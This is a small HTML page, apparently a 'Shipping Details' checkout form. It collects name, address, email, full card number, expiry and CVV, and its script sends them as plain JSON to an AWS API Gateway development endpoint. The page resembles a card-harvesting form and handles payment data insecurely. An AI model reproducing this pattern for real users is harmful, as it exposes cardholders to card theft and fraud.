<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Shipping Details</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 40px;
      }
      input {
        width: 300px;
        padding: 8px;
        margin-bottom: 10px;
      }
      button {
        padding: 10px 16px;
        background-color: #0073bb;
        border: none;
        color: white;
        cursor: pointer;
        border-radius: 4px;
      }
      button:hover {
        background-color: #005fa3;
      }
    </style>
  </head>

  <body>
    <h2>Shipping Details</h2>

    <form id="shippingForm">
      <label>Name:</label><br />
      <input type="text" id="name" required /><br />

      <label>Address:</label><br />
      <input type="text" id="address" required /><br />

      <label>Email:</label><br />
      <input type="email" id="email" required /><br />

      <label>Product Name:</label><br />
      <input type="text" id="product" required /><br />

      <label>Card Number:</label><br />
      <input type="text" id="card" maxlength="16" required /><br />

      <label>Expiration (MM/YY):</label><br />
      <input type="text" id="exp" maxlength="5" placeholder="MM/YY" required /><br />

      <label>CVV:</label><br />
      <input type="number" id="cvv" maxlength="3" required /><br />

      <button type="submit">Submit</button>
    </form>

    <script>
      document.getElementById("shippingForm").addEventListener("submit", async (e) => {
        e.preventDefault();

        const data = {
          name: document.getElementById("name").value,
          address: document.getElementById("address").value,
          email: document.getElementById("email").value,
          product: document.getElementById("product").value,
          credit_card: document.getElementById("card").value,
          exp: document.getElementById("exp").value,
          cvv: document.getElementById("cvv").value
        };

        try {
          const response = await fetch("https://twxs3l36n1.execute-api.us-east-2.amazonaws.com/dev/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });

          const result = await response.json();

          if (!response.ok) {
            alert("Error: " + (result.error || "Failed to submit form."));
          } else {
            alert("Shipping details submitted successfully!\nProduct ID: " + result.product_id);
          }
        } catch (error) {
          alert("Network error: " + error.message);
        }
      });
    </script>
  </body>
</html>
